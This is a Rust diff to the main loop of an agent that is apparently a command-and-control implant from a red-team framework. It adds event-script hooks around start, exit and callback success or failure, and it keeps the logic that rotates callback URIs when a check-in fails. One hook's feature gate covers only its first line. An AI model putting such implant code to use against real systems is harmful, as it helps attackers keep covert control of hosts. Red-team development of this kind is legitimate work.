@@ -1,14 +1,19 @@
 use anyhow::Result;
+#[cfg(feature = "events")]
+use std::collections::BTreeMap;
 use std::sync::Arc;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::time::{Duration, Instant};
 
+#[cfg(feature = "events")]
+use eldritchv2::conversion::ToValue;
 use crate::agent::ImixAgent;
 use crate::task::TaskRegistry;
 use crate::version::VERSION;
 use pb::config::Config;
 use transport::{ActiveTransport, Transport};
 
+#[cfg(feature = "events")]
 use crate::event;
 
 pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);
@@ -43,7 +48,11 @@ pub async fn run_agent() -> Result<()> {
 
     // Run the onstart event script
     #[cfg(feature = "events")]
-    event::onevent("on_start");
+    {
+        event::load_event_script();
+        tokio::spawn(crate::event::catch_signals());
+        tokio::spawn(event::on_event("on_start", BTreeMap::new()));
+    }
 
     while !SHUTDOWN.load(Ordering::Relaxed) {
         let start = Instant::now();
@@ -73,7 +82,7 @@ pub async fn run_agent() -> Result<()> {
 
     // Run the on_exit event script
     #[cfg(feature = "events")]
-    event::onevent("on_exit");
+    event::on_event("on_exit", BTreeMap::new()).await;
 
     #[cfg(debug_assertions)]
     log::info!("Agent shutting down");
@@ -128,11 +137,19 @@ async fn process_tasks(agent: &ImixAgent<ActiveTransport>, _registry: &TaskRegis
         Ok(_) => {
             #[cfg(debug_assertions)]
             log::info!("Callback success");
+
+            #[cfg(feature = "events")]
+            tokio::spawn(event::on_event("on_callback_success", BTreeMap::new()));
         }
-        Err(_e) => {
+        Err(e) => {
             #[cfg(debug_assertions)]
-            log::error!("Callback failed: {_e:#}");
+            log::error!("Callback failed: {e:#}");
             agent.rotate_callback_uri().await;
+
+            #[cfg(feature = "events")]
+            let mut map = BTreeMap::new();
+            map.insert("error".to_string(), e.root_cause().to_string().to_value());
+            tokio::spawn(event::on_event("on_callback_fail", map));
         }
     }
 }
